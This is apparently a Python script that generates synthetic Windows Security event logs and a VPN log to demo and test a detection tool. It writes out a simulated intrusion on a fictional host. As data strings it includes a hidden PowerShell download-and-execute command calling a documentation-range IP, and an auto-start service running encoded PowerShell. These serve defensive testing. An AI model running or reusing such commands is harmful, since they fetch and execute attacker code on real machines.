"""Generate synthetic sample logs in sample_data/ for demos and tests.

All hosts, users and IPs are fictional (IPs from RFC 5737 documentation ranges).
Scenario on WS-FINANCE01, 2026-03-02 (UTC):
  - normal workday logons
  - normal process activity (4688)
  - 02:40 kpatel RDP logon (off-hours); overnight service and DWM logons that are not
  - 09:15 brute force on 'administrator' from 203.0.113.50, ending in a success
  - 09:17 reconnaissance commands run as 'administrator'
  - 10:30 jdoe opens a document: WINWORD spawns PowerShell, which runs C:\\Users\\Public\\update.exe
  - 11:00 password spray from 198.51.100.7 across 8 accounts
  - 13:30 new user 'svc_backup2' created and added to Administrators
  - 13:42 service installed running encoded PowerShell
  - 13:50 Security log cleared
"""

from __future__ import annotations

import csv
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "sample_data"
HOST = "WS-FINANCE01.corp.example"
DAY = datetime(2026, 3, 2, tzinfo=timezone.utc)
rng = random.Random(42)

LOGON_TYPES = {"2": "Interactive", "3": "Network", "10": "RemoteInteractive"}


def msg_4624(user: str, ip: str, ltype: str) -> str:
    return ("An account was successfully logged on.\n\nSubject:\n\tAccount Name:\t\tWS-FINANCE01$\n"
            f"\nLogon Information:\n\tLogon Type:\t\t{ltype}\n\nNew Logon:\n\tAccount Name:\t\t{user}\n"
            f"\tAccount Domain:\t\tCORP\n\nNetwork Information:\n\tSource Network Address:\t{ip}\n")


def msg_4625(user: str, ip: str, ltype: str) -> str:
    return ("An account failed to log on.\n\nSubject:\n\tAccount Name:\t\t-\n"
            f"\nLogon Type:\t\t\t{ltype}\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\t{user}\n"
            "\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n"
            f"\nNetwork Information:\n\tSource Network Address:\t{ip}\n")


def msg_4688(user: str, image: str, parent: str, cmd: str) -> str:
    return ("A new process has been created.\n\nCreator Subject:\n\tAccount Name:\t\t" + user +
            "\n\nTarget Subject:\n\tAccount Name:\t\t-\n\nProcess Information:\n"
            f"\tNew Process Name:\t{image}\n\tCreator Process Name:\t{parent}\n\tProcess Command Line:\t{cmd}\n")


def build_events() -> list[dict]:
    ev: list[dict] = []

    def add(ts, eid, msg, level="Information", provider="Microsoft-Windows-Security-Auditing"):
        ev.append({"ts": ts, "id": eid, "provider": provider, "level": level, "msg": msg})

    staff = ["jdoe", "asmith", "mlee", "kpatel", "rgarcia"]
    for i in range(60):  # normal activity
        t = DAY + timedelta(hours=8, minutes=rng.randint(0, 600), seconds=rng.randint(0, 59))
        user = rng.choice(staff)
        add(t, 4624, msg_4624(user, f"10.0.0.{rng.randint(20, 80)}", rng.choice(["2", "3"])))
        if rng.random() < 0.08:  # occasional typo
            add(t - timedelta(seconds=5), 4625, msg_4625(user, "10.0.0.31", "2"), level="Information")

    t = DAY + timedelta(hours=9, minutes=15)  # brute force
    for i in range(14):
        add(t + timedelta(seconds=8 * i), 4625, msg_4625("administrator", "203.0.113.50", "3"))
    add(t + timedelta(seconds=8 * 14 + 3), 4624, msg_4624("administrator", "203.0.113.50", "3"))
    add(t + timedelta(seconds=8 * 14 + 4), 4672,
        "Special privileges assigned to new logon.\n\nSubject:\n\tAccount Name:\t\tadministrator\n")

    # night: one real off-hours RDP logon, plus two that must not be flagged
    add(DAY + timedelta(hours=1), 4624, msg_4624("svc_backup", "10.0.0.12", "3"))     # network logon
    add(DAY + timedelta(hours=1, minutes=58), 4624, msg_4624("DWM-1", "-", "2"))      # boot logon
    add(DAY + timedelta(hours=2, minutes=40), 4624, msg_4624("kpatel", "10.0.0.77", "10"))

    sys32, cmd = "C:\\Windows\\System32\\", "C:\\Windows\\System32\\cmd.exe"
    for i in range(25):  # routine process activity, incl. one lone ipconfig (must not count as recon)
        t = DAY + timedelta(hours=8, minutes=rng.randint(0, 600))
        user = rng.choice(staff)
        image, parent = rng.choice([
            ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Windows\\explorer.exe"),
            ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "C:\\Windows\\explorer.exe"),
            (sys32 + "notepad.exe", "C:\\Windows\\explorer.exe"),
        ])
        add(t, 4688, msg_4688(user, image, parent, f'"{image}"'))
    add(DAY + timedelta(hours=14, minutes=5), 4688, msg_4688("mlee", sys32 + "ipconfig.exe", cmd, "ipconfig /all"))

    t = DAY + timedelta(hours=9, minutes=17)  # recon by the attacker after the brute-force success
    for i, (exe, args) in enumerate([("whoami.exe", "whoami /all"), ("net.exe", "net user"),
                                     ("net.exe", "net localgroup administrators"), ("ipconfig.exe", "ipconfig /all"),
                                     ("systeminfo.exe", "systeminfo"), ("nltest.exe", "nltest /domain_trusts")]):
        add(t + timedelta(seconds=25 * i), 4688, msg_4688("administrator", sys32 + exe, cmd, args))

    t = DAY + timedelta(hours=10, minutes=30)  # phishing document -> PowerShell -> dropped binary
    add(t, 4688, msg_4688(
        "jdoe", sys32 + "WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.20/a.ps1')\""))
    add(t + timedelta(seconds=40), 4688, msg_4688(
        "jdoe", "C:\\Users\\Public\\update.exe", sys32 + "WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Users\\Public\\update.exe"))

    t = DAY + timedelta(hours=11)  # password spray
    for i, user in enumerate(["jdoe", "asmith", "mlee", "kpatel", "rgarcia", "tnguyen", "bwilson", "hr_admin"]):
        add(t + timedelta(seconds=20 * i), 4625, msg_4625(user, "198.51.100.7", "3"))
    add(t + timedelta(minutes=4), 4740,
        "A user account was locked out.\n\nSubject:\n\tAccount Name:\t\tDC01$\n\n"
        "Account That Was Locked Out:\n\tAccount Name:\t\thr_admin\n")

    t = DAY + timedelta(hours=13, minutes=30)  # persistence
    add(t, 4720, "A user account was created.\n\nSubject:\n\tAccount Name:\t\tadministrator\n\n"
                 "New Account:\n\tAccount Name:\t\tsvc_backup2\n")
    add(t + timedelta(minutes=1), 4732,
        "A member was added to a security-enabled local group.\n\nSubject:\n\tAccount Name:\t\tadministrator\n\n"
        "Member:\n\tAccount Name:\t\tsvc_backup2\n\nGroup:\n\tGroup Name:\t\tAdministrators\n")
    add(t + timedelta(minutes=12), 7045,
        "A service was installed in the system.\n\nService Name:  WinUpdateHelper\n"
        "Service File Name:  powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\n"
        "Service Type:  user mode service\nService Start Type:  auto start\nService Account:  LocalSystem",
        provider="Service Control Manager")
    add(t + timedelta(minutes=20), 1102,
        "The audit log was cleared.\nSubject:\n\tAccount Name:\tadministrator\n",
        provider="Microsoft-Windows-Eventlog")
    return sorted(ev, key=lambda e: e["ts"])


def write_powershell_csv(events: list[dict], path: Path) -> None:
    """Shape of: Get-WinEvent ... | Select TimeCreated,Id,ProviderName,LevelDisplayName,MachineName,Message | Export-Csv"""
    with path.open("w", newline="", encoding="utf-8") as f:
        w = csv.writer(f, quoting=csv.QUOTE_ALL)
        w.writerow(["TimeCreated", "Id", "ProviderName", "LevelDisplayName", "MachineName", "Message"])
        for e in events:
            w.writerow([e["ts"].strftime("%Y-%m-%dT%H:%M:%SZ"), e["id"], e["provider"], e["level"], HOST, e["msg"]])


def write_eventviewer_csv(events: list[dict], path: Path) -> None:
    """Shape of Event Viewer 'Save All Events As... CSV': 5 headers, message in an unlabeled 6th field."""
    with path.open("w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["Keywords", "Date and Time", "Source", "Event ID", "Task Category"])
        for e in events:
            kw = "Audit Failure" if e["id"] == 4625 else "Audit Success"
            w.writerow([kw, e["ts"].strftime("%Y-%m-%d %H:%M:%S"), e["provider"], e["id"], "Logon", e["msg"]])


def write_text_log(path: Path) -> None:
    """A generic application / VPN gateway auth log."""
    lines = []
    t = DAY + timedelta(hours=7)
    for i in range(20):
        lines.append(f"{(t + timedelta(minutes=17 * i)).isoformat()} INFO vpn-gw01 "
                     f"Login successful for user {rng.choice(['jdoe', 'mlee', 'asmith'])} from 10.0.0.{40 + i}")
    t = DAY + timedelta(hours=22, minutes=3)
    for i in range(9):
        lines.append(f"{(t + timedelta(seconds=11 * i)).isoformat()} WARN vpn-gw01 "
                     f"Authentication failed for user svc_sql from 192.0.2.66 (bad password)")
    lines.append(f"{(t + timedelta(minutes=3)).isoformat()} WARN vpn-gw01 Account svc_sql locked after repeated failures")
    lines.append(f"{(t + timedelta(minutes=5)).isoformat()} INFO vpn-gw01 Config reload completed")
    lines.sort()
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def main() -> None:
    OUT.mkdir(exist_ok=True)
    events = build_events()
    write_powershell_csv(events, OUT / "security_powershell_export.csv")
    write_eventviewer_csv(events, OUT / "security_eventviewer_export.csv")
    write_text_log(OUT / "vpn_auth.log")
    print(f"Wrote {len(events)} Windows events and a text log to {OUT}")


if __name__ == "__main__":
    main()
